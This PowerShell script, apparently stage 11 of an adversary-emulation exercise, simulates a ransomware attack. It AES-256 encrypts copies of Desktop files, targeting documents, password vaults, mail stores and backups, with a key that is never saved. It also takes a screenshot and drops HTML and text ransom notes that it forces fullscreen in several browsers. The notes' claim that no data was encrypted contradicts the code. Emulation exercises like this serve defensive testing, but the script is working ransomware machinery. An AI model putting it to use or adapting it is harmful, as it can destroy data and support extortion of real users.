<#
.SYNOPSIS
    Stage 11 — Ransomware Simulation (Real Actions)
.DESCRIPTION
    Encrypts files on the Desktop using AES-256-CBC, captures the screen,
    displays ransom note as full-screen overlay (Python-style).
#>

# ── Helper function: Escaping brackets for Write-Host ──
$ok = "+"
$no = "-"

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 11: RANSOMWARE SIMULATION" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$desktopPath = [Environment]::GetFolderPath("Desktop")
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$encryptedDir = "$desktopPath\FILES_ENCRYPTED_$timestamp"

Write-Host "[*] Creating encrypted file directory..." -ForegroundColor Yellow
New-Item -Path $encryptedDir -ItemType Directory -Force | Out-Null
Write-Host "  $ok Directory: $encryptedDir" -ForegroundColor Green
Write-Host ""

# ── AES Encryption Setup ──
<#
.SYNOPSIS
    Encrypts a file using AES-256-CBC and saves .encrypted version.
#>
function Invoke-AESEncrypt {
    param(
        [string]$FilePath,
        [string]$OutputPath,
        [byte[]]$Key,
        [byte[]]$IV
    )
    
    try {
        $content = [System.IO.File]::ReadAllBytes($FilePath)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Key = $Key
        $aes.IV = $IV
        
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)
        
        # Format: IV (16 bytes) + EncryptedData
        $outputBytes = $IV + $encryptedBytes
        [System.IO.File]::WriteAllBytes($OutputPath, $outputBytes)
        
        $aes.Dispose()
        return $true
    } catch {
        return $false
    }
}

# Generate AES-256 key once (all files share it for simulation purposes)
$aesKey = New-Object byte[] 32
$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
$rng.GetBytes($aesKey)

Write-Host "[*] SCANNING DESKTOP FOR TARGET FILES" -ForegroundColor Yellow

# Get all files on Desktop (excluding our own .encrypted outputs and directories)
$targetExtensions = @('.txt', '.docx', '.xlsx', '.pptx', '.pdf', '.csv', '.xml', '.ps1', '.bat', '.jpg', '.png', '.zip', '.rar', '.7z', '.bak', '.sql', '.kdbx', '.vsdx', '.pst', '.eml')
$targetFiles = Get-ChildItem -Path $desktopPath -File | Where-Object {
    $targetExtensions -contains $_.Extension.ToLower() -and
    $_.Extension.ToLower() -ne '.encrypted' -and
    $_.Name -notlike 'RECOVER_INSTRUCTIONS*'
}

Write-Host "  Found $($targetFiles.Count) target files on Desktop" -ForegroundColor Yellow
Write-Host ""

# ── Encrypt Files ──
Write-Host "[*] ENCRYPTING FILES (AES-256-CBC)" -ForegroundColor Yellow
Write-Host ""

$encryptedCount = 0
foreach ($file in $targetFiles) {
    $encryptedPath = "$encryptedDir\$($file.BaseName).encrypted"
    
    # Generate random IV for each file
    $iv = New-Object byte[] 16
    $rng.GetBytes($iv)
    
    $result = Invoke-AESEncrypt -FilePath $file.FullName -OutputPath $encryptedPath -Key $aesKey -IV $iv
    
    if ($result) {
        $encryptedCount++
        Write-Host "    $ok $($file.Name) -> $($file.BaseName).encrypted" -ForegroundColor Yellow
    } else {
        Write-Host "    $no Failed: $($file.Name)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "  $ok Encrypted $encryptedCount files to: $encryptedDir" -ForegroundColor Green
Write-Host ""

# ── Screen Capture (Python-style) ──
Write-Host "[*] CAPTURING SCREENSHOT + DISPLAYING RANSOM NOTE" -ForegroundColor Yellow

# 1. Take a screenshot using .NET
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    
    $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screenBounds.X, $screenBounds.Y, 0, 0, $screenBounds.Size)
    
    $screenshotPath = "$desktopPath\SCREENSHOT_$timestamp.png"
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    Write-Host "  $ok Screenshot saved: $screenshotPath" -ForegroundColor Green
} catch {
    Write-Host "  $no Screenshot failed: $_" -ForegroundColor Red
}

# 2. Create the ransom note image on Desktop (simulating the Python img download)
$ransomId = -join ((65..90) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$btcAddress = "1" + (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 33 | ForEach-Object { [char]$_ }))

# Create a full-screen HTML ransom note that opens maximized
$ransomHtml = @"
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>YOUR COMPUTER HAS BEEN LOCKED</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            width: 100%; height: 100%;
            background: #000;
            color: #f00;
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%; height: 100%;
            padding: 40px;
            background: radial-gradient(ellipse at center, #1a0000 0%, #000000 100%);
        }
        h1 {
            font-size: 72px;
            color: #ff0000;
            text-shadow: 0 0 30px rgba(255,0,0,0.7);
            margin-bottom: 20px;
            letter-spacing: 10px;
            text-transform: uppercase;
        }
        .subtitle {
            font-size: 28px;
            color: #ff4444;
            margin-bottom: 40px;
            animation: blink 1.5s infinite;
        }
        .box {
            border: 3px solid #ff0000;
            background: rgba(255,0,0,0.05);
            padding: 30px 50px;
            max-width: 700px;
            text-align: left;
            font-size: 18px;
            line-height: 1.8;
            box-shadow: 0 0 50px rgba(255,0,0,0.3);
        }
        .box .label { color: #888; }
        .box .value { color: #ff6666; }
        .warning-text {
            font-size: 22px;
            font-weight: bold;
            color: #ff0;
            text-align: center;
            margin-top: 30px;
        }
        .sim-footer {
            position: fixed;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #333;
            font-size: 11px;
        }
        @@keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .scanline {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0,0,0,0.15) 0px,
                rgba(0,0,0,0.15) 1px,
                transparent 1px,
                transparent 3px
            );
            pointer-events: none;
            z-index: 999;
        }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="container">
        <h1>⚠ LOCKED ⚠</h1>
        <div class="subtitle">YOUR FILES HAVE BEEN ENCRYPTED</div>
        <div class="box">
            <p><span class="label">Host:</span>       <span class="value">$env:COMPUTERNAME</span></p>
            <p><span class="label">User:</span>       <span class="value">$env:USERNAME</span></p>
            <p><span class="label">Domain:</span>     <span class="value">$env:USERDOMAIN</span></p>
            <p><span class="label">Date:</span>       <span class="value">$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</span></p>
            <p><span class="label">Files:</span>      <span class="value">$encryptedCount files encrypted</span></p>
            <p><span class="label">Ransom ID:</span>  <span class="value">$ransomId</span></p>
            <p><span class="label">BTC:</span>        <span class="value">$btcAddress</span></p>
            <p><span class="label">Amount:</span>     <span class="value">0.5 BTC (~$35,000 USD)</span></p>
        </div>
        <div class="warning-text">⚠ CONTACT: ransomware-sim@outbreak2026.test ⚠</div>
    </div>
    <div class="sim-footer">
        SIMULATION — OUTBREAK 2026 ADVERSARY EMULATION — No actual data was encrypted
    </div>
    <script>
        // Force fullscreen
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(() => {});
        }
    </script>
</body>
</html>
"@

$ransomNotePath = "$desktopPath\RECOVER_INSTRUCTIONS.html"
Set-Content -Path $ransomNotePath -Value $ransomHtml -Force
Write-Host "  $ok Ransom note created: $ransomNotePath" -ForegroundColor Green

# Also create a simple text version
$txtNotePath = "$desktopPath\RECOVER_INSTRUCTIONS.txt"
$txtNote = @"
================================================================================
                    YOUR FILES HAVE BEEN ENCRYPTED
================================================================================

Host:         $env:COMPUTERNAME
User:         $env:USERNAME
Date:         $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Files encrypted: $encryptedCount
Ransom ID:       $ransomId
BTC Address:     $btcAddress

Contact: ransomware-sim@outbreak2026.test
Amount:  0.5 BTC (~$35,000 USD)

================================================================================
SIMULATION - OUTBREAK 2026 ADVERSARY EMULATION
No actual data was encrypted. Authorized penetration test.
================================================================================
"@
Set-Content -Path $txtNotePath -Value $txtNote -Force

# ── Display Everything ──
Write-Host ""
Write-Host "[*] OPENING ENCRYPTED FILES AND RANSOM NOTE" -ForegroundColor Yellow

try {
    # Open the encrypted directory in Explorer
    Invoke-Item $encryptedDir -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 300
    
    # Open ransom note in browser (full-screen styled)
    Start-Process "msedge.exe" -ArgumentList "--new-window --start-fullscreen `"file:///$($ransomNotePath.Replace('\','/'))`"" -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 300
    Start-Process "chrome.exe" -ArgumentList "--new-window --start-fullscreen `"file:///$($ransomNotePath.Replace('\','/'))`"" -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 300
    Start-Process "firefox.exe" -ArgumentList "--new-window -fullscreen `"file:///$($ransomNotePath.Replace('\','/'))`"" -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 300
    
    # Fallback: just open with default browser
    Invoke-Item $ransomNotePath -ErrorAction SilentlyContinue
    
    Write-Host "  $ok Ransom note displayed fullscreen" -ForegroundColor Green
} catch {
    Write-Host "  $no Could not open files automatically" -ForegroundColor Red
}
Write-Host ""

# ── Summary ──
Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 11 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Screenshot:          $screenshotPath"
Write-Host "  Encrypted files:     $encryptedDir"
Write-Host "  Ransom note (HTML):  $ransomNotePath"
Write-Host "  Ransom note (TXT):   $txtNotePath"
Write-Host "  Files encrypted:     $encryptedCount"
Write-Host "  Ransom ID:           $ransomId"
Write-Host "  BTC Address:         $btcAddress"
Write-Host "  AES Key (hex):       $([System.BitConverter]::ToString($aesKey).Replace('-','').Substring(0,16))..."
Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host " ALL STAGES COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green